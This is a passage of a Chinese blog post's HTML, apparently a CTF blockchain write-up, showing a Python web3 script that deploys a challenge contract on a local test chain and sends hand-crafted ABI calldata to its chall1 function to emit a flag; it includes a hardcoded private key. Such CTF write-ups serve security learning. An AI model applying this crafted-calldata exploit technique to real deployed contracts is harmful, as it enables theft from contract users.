+<p>调用结果<br><img src="https://img-blog.csdnimg.cn/img_convert/338b78df4db2961ee62b0e00ebdc5ce0.png" srcset="/img/loading.gif" lazyload></p>
+<p>攻击脚本</p>
+<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">import solcx<br>from solcx import compile_files<br>from web3 import Web3,HTTPProvider<br>from hexbytes import *<br><br>def generate_tx(chainID, to, data, value):<br>    <span class="hljs-meta"># print(web3.eth.gasPrice)</span><br>    <span class="hljs-meta"># print(web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)))</span><br>    txn = &#123;<br>        &#x27;chainId&#x27;: chainID,<br>        &#x27;from&#x27;: Web3.toChecksumAddress(account_address),<br>        &#x27;to&#x27;: to,<br>        &#x27;gasPrice&#x27;: web3.eth.gasPrice ,<br>        &#x27;gas&#x27;: <span class="hljs-number">672197400</span>,<br>        &#x27;nonce&#x27;: web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)) ,<br>        &#x27;value&#x27;: Web3.toWei(value, &#x27;ether&#x27;),<br>        &#x27;data&#x27;: data,<br>    &#125;<br>    <span class="hljs-meta"># print(txn)</span><br>    return txn<br><br>def sign_and_send(txn):<br>    signed_txn = web3.eth.account.signTransaction(txn, private_key)<br>    txn_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()<br>    txn_receipt = web3.eth.waitForTransactionReceipt(txn_hash)<br>    <span class="hljs-meta"># print(&quot;txn_hash=&quot;, txn_hash)</span><br>    return txn_receipt<br><br>def deploy_Bearparse():<br>    compiled_sol = compile_files([<span class="hljs-string">&quot;source1.sol&quot;</span>],output_values=[<span class="hljs-string">&quot;abi&quot;</span>, <span class="hljs-string">&quot;bin&quot;</span>],solc_version=<span class="hljs-string">&quot;0.8.15&quot;</span>)<br>    data = compiled_sol[&#x27;source1.sol:Bearparse&#x27;][&#x27;bin&#x27;]<br>    <span class="hljs-meta"># print(data)</span><br>    txn = generate_tx(chain_id, &#x27;&#x27;, data, <span class="hljs-number">0</span>)<br>    txn_receipt = sign_and_send(txn)<br>    attack_abi = compiled_sol[&#x27;source1.sol:Bearparse&#x27;][&#x27;abi&#x27;]<br>    <span class="hljs-meta"># print(txn_receipt)</span><br>    if txn_receipt[&#x27;status&#x27;] == <span class="hljs-number">1</span>:<br>        attack_address = txn_receipt[&#x27;contractAddress&#x27;]<br>        return attack_address,attack_abi<br>    else:<br>        exit(<span class="hljs-number">0</span>)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    <span class="hljs-meta"># exp()</span><br>    solcx.install_solc(&#x27;0.8.15&#x27;)<br>    rpc = <span class="hljs-string">&quot;http://127.0.0.1:8545&quot;</span><br>    web3 = Web3(HTTPProvider(rpc))<br>    private_key = &#x27;bf5ff<span class="hljs-number">7715</span>bc<span class="hljs-number">903291</span>1a0c50f84b4f4cf5c533fd<span class="hljs-number">6653</span>9e626a96c4ea6d6e3af55&#x27;<br>    acct = web3.eth.account.from_key(private_key)<br>    account_address = acct.address<br>    chain_id = <span class="hljs-number">5777</span><br>    print(<span class="hljs-string">&quot;[+] account_address is &quot;</span> + str(account_address))<br>    print(<span class="hljs-string">&quot;[+] account_Balance is &quot;</span> + str(web3.eth.getBalance(account_address)))<br><br>    Bearparse_address,Bearparse_abi = deploy_Bearparse()<br>    Bearparse_instance = web3.eth.contract(address=Bearparse_address, abi=Bearparse_abi)<br>    print(Bearparse_instance.all_functions())<br><br>    <span class="hljs-meta">#chall1(bool begin,huhu calldata inputs,bytes32[2] calldata hole)</span><br>    functionSign = HexBytes(web3.sha3(text=&#x27;chall1(bool,tuple(tuple(uint256,uint256,bytes),tuple(uint256,uint256,string)),bytes32[2])&#x27;)).hex()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    calldata=&#x27;0x26ad<span class="hljs-number">15930000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000100</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00008000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000001</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000001000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">40000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000</span>e<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000006</span>f<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">000000</span>6f<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000060000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span>204e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000060000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000</span>6fb9eccc<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000060000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span>204e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e&#x27;<br>    chall1_addr = generate_tx(chain_id, Bearparse_address,calldata,<span class="hljs-number">0</span>)<br>    flag = sign_and_send(chall1_addr)<br>    <span class="hljs-meta"># print(flag[&quot;logs&quot;])</span><br>    print(Bearparse_instance.events.SendFlag().processLog(flag[<span class="hljs-string">&quot;logs&quot;</span>][<span class="hljs-number">0</span>]))<br><br><br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/da038e7e233e1f3ea2dfaf580cac2b0f.png" srcset="/img/loading.gif" lazyload></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/blockchain/">blockchain</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/15/2022-11-18-bilibili%20blockchain/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">bilibili blockchain</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/10/2022-11-10-bytectf-finnal%E5%B0%8F%E7%BB%93/">
+                        <span class="hidden-mobile">bytectf-finnal小结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
